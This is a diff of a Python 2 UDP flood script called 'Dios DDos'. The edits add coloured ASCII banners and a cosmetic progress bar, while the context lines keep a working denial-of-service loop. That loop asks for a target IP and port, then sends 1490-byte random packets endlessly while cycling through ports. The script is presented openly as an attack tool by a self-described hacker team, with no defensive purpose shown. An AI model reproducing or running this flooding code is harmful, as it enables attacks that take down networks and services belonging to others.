@@ -12,14 +12,25 @@ day = now.day
 month = now.month
 year = now.year
 
+#cores
+Azul = '\033[94m'
+Verde = '\033[92m'
+Amarelo = '\033[93m'
+Vermelho = '\033[91m'
+Fim = '\033[0m'
+
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 ############
 
 os.system("clear")
-os.system("figlet Dios DDos")
-print "  https://github.com/DiosDeLaWeb/Dios-DDos"
+print "\033[91m ____  _             ____  ____\033[0m"
+print "\033[91m|  _ \(_) ___  ___  |  _ \|  _ \  ___  ___\033[0m"
+print "\033[91m| | | | |/ _ \/ __| | | | | | | |/ _ \/ __|\033[0m"
+print "\033[91m| |_| | | (_) \__ \ | |_| | |_| | (_) \__ \|\033[0m"
+print "\033[91m|____/|_|\___/|___/ |____/|____/ \___/|___/\033[0m"
+print " https://github.com/DiosDeLaWeb/Dios-DDos"
 print
 print "codder by: dios de la web   #dono do script"
 print "new team 404                #melhor team hacker"
@@ -33,22 +44,27 @@ ip = raw_input("IP Alvo :")
 port = input("Port       :")
 
 os.system("clear")
-os.system("figlet ddos go")
-print "[                    ] 0% "
+print "\033[92m ____  ____   ___  ____     ____  ___\033[0m"
+print "\033[92m|  _ \|  _ \ / _ \/ ___|   / ___|/ _ \|\033[0m"
+print "\033[92m| | | | | | | | | \___ \  | |  _| | | |\033[0m"
+print "\033[92m| |_| | |_| | |_| |___) | | |_| | |_| |\033[0m"
+print "\033[92m|____/|____/ \___/|____/   \____|\___/\033[0m"
+print
+print "[                              ] 0% "
 time.sleep(5)
-print "[>>>>>               ] 25% "
+print "[\033[92m>>>>>>>\033[0m                       ] 25% "
 time.sleep(5)
-print "[>>>>>>>>>>          ] 50% "
+print "[\033[92m>>>>>>>>>>>>>>>\033[0m               ] 50% "
 time.sleep(5)
-print "[>>>>>>>>>>>>>>>     ] 75% "
+print "[\033[92m>>>>>>>>>>>>>>>>>>>>>>>\033[0m       ] 75% "
 time.sleep(5)
-print "[>>>>>>>>>>>>>>>>>>>>] 100% "
+print "[\033[92m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>\033[0m] 100% "
 time.sleep(3)
 sent = 0
 while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
-    print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+    print "\033[92mSent %s packet to %s throught port:%s\033[0m"%(sent,ip,port)
     if port == 65534:
         port = 1
